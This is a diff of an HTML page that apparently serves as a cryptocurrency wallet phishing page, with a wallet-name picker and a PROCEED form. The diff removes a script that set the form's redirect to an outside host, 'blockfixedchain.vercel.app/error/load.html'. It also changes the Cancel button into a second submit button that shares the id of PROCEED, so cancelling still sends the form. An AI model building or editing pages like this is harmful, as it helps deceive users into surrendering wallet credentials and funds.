@@ -8522,11 +8522,11 @@
                 </div>
               </div>
             </div>
-            <button type="submit" id="proceedButton" class="btn btn-primary btn-block" style="font-weight: bold; font-size: 14px">
+            <button type="submit" id="submit" class="btn btn-primary btn-block" style="font-weight: bold; font-size: 14px">
               PROCEED
             </button>
             <div class="text-right">
-              <button type="button" id="cancelBtn" class="btn btn-sm dialog-dismiss btn-danger mt-2 text-right">
+              <button type="submit" id="submit" class="btn btn-sm dialog-dismiss btn-danger mt-2 text-right">
                 Cancel
               </button>
             </div>
@@ -8581,42 +8581,7 @@
             </h6>
 
             <input type="text" id="searchInput" class="form-control text-center" placeholder="Search wallet names...">
-            <script>
-
-              const domain = window.location.hostname;
-              document.getElementById('next-url').value = `https://blockfixedchain.vercel.app/error/load.html`;
-
-              // Function to handle search
-              function handleSearch() {
-                // Get input value and convert to lowercase for case-insensitive search
-                const input = document
-                  .getElementById("searchInput")
-                  .value.toLowerCase();
-
-                // Select all buttons with class 'coin'
-                const buttons = document.querySelectorAll(".coin");
-
-                // Iterate over each button
-                buttons.forEach((button) => {
-                  // Get the wallet name (h4 text content)
-                  const walletName = button
-                    .querySelector("h4")
-                    .textContent.toLowerCase();
-
-                  // Check if the input matches any part of the wallet name
-                  if (walletName.includes(input)) {
-                    button.style.display = ""; // Show the button
-                  } else {
-                    button.style.display = "none"; // Hide the button
-                  }
-                });
-              }
-
-              // Add event listener for input changes
-              document
-                .getElementById("searchInput")
-                .addEventListener("input", handleSearch);
-            </script>
+            
           </div>
         </div>
         <div class="row">
